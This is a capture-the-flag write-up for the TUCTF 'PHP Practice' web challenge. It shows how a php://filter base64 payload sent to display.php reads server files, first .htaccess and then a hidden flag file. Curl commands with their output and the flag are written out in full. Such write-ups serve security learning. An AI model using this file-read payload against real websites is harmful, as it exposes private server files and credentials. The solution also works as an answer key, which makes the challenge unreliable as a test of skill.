# PHP Practice [187 Solves]

## Description

> Have you ever seen an image on a website, and wished you could use the link to view it from a different domain? Me neither, but I needed web dev practice so I implemented it anyways! Give it a try -- Feed my site a link and it'll load your file!
>
> <https://php-practice.tuctf.com>

No attachment

## Flag

TUCTF{th1s_i5_my_secr3t_l0c@l_f1le!}

## Solution

Access <https://php-practice.tuctf.com> and looking at index.html:

```html
<!-- index.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Content Viewer</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
    <h2>Enter a Link</h2>
    <form action="display.php" method="post">
        <label for="link">Link:</label>
        <input type="text" id="link" name="link" required>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
<!--TODO: Hide Secret Files-->
```

There is secret file.

It has Path Traversal (not LFI) in /display.php path link parameter.

- payload: `php://filter/convert.base64-encode/resource=/var/www/html/path/to/file`

The secret files were not /var/www/html/secret.txt or /var/www/html/flag.txt, but I could get /var/www/html/.htaccess.
In .htaccess, I found the hidden file named as gcfYAvzsbyxV.txt.
Got gcfYAvzsbyxV.txt by Path Traversal, I got the flag.

```console
$ curl https://php-practice.tuctf.com/display.php --data-urlencode link=php://filter/convert.base64-encode/resource=/var/www/html/.htaccess
<!DOCTYPE html>
                      <html lang='en'>
                      <head>
                          <meta charset='UTF-8'>
                          <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                          <title>Link Content Display</title>
                      </head>
                      <body>
                          <h2>Content of the Link</h2>
                          <p>PEZpbGVzICJnY2ZZQXZ6c2J5eFYudHh0Ij4KICAgIG9yZGVyIGRlbnksYWxsb3cKICAgIGRlbnkgZnJvbSBhbGwKICAgIGFsbG93IGZyb20gbG9jYWxob3N0IDEyNy4wLjAuMSAwLjAuMC4wCjwvRmlsZXM+Cg==</p>
                      </body>
                      </html>
                      
$ B64=PEZpbGVzICJnY2ZZQXZ6c2J5eFYudHh0Ij4KICAgIG9yZGVyIGRlbnksYWxsb3cKICAgIGRlbnkgZnJvbSBhbGwKICAgIGFsbG93IGZyb20gbG9jYWxob3N0IDEyNy4wLjAuMSAwLjAuMC4wCjwvRmlsZXM+Cg==

$ echo -n $B64 | base64 -d
<Files "gcfYAvzsbyxV.txt">
    order deny,allow
    deny from all
    allow from localhost 127.0.0.1 0.0.0.0
</Files>

$ curl https://php-practice.tuctf.com/display.php --data-urlencode link=php://filter/convert.base64-encode/resource=gcfYAvzsbyxV.txt
<!DOCTYPE html>
                      <html lang='en'>
                      <head>
                          <meta charset='UTF-8'>
                          <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                          <title>Link Content Display</title>
                      </head>
                      <body>
                          <h2>Content of the Link</h2>
                          <p>VFVDVEZ7dGgxc19pNV9teV9zZWNyM3RfbDBjQGxfZjFsZSF9Cg==</p>
                      </body>
                      </html>
                      
$ echo -n 'VFVDVEZ7dGgxc19pNV9teV9zZWNyM3RfbDBjQGxfZjFsZSF9Cg==' | base64 -d
TUCTF{th1s_i5_my_secr3t_l0c@l_f1le!}
```
